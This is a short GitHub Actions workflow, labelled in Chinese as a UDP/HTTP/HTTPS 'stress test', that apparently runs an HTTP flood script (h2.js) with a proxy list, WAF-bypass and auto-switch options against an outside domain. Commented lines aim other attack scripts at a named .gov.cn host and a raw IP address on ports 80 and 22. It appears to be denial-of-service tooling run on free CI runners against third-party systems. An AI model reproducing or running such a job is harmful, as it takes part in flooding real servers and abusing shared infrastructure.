name: UDP/HTTP/HTTPS 压测（纯 Node）

on:
  workflow_dispatch:

jobs:
  flood-test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Install Node (默认已装)
        run: node -v   # 可选，确保 Node≥14

      # 只要阈值不满足，这一步会返回非 0，GitHub 自动标记为 failed
      - name: Run flood test (quiet)
        run: |
          node h2.js https://rootme.wssllhdg.dpdns.org cc.txt 21000 80 1 1 GET --waf --mode full --random-speed --auto-switch
          # python3 exploit-test.py cnmdsb.sbgov.cn 443 --no-ssl
          # sudo python 12.py 103.116.247.42 80
          # python3 15.py 103.116.247.42 22 300
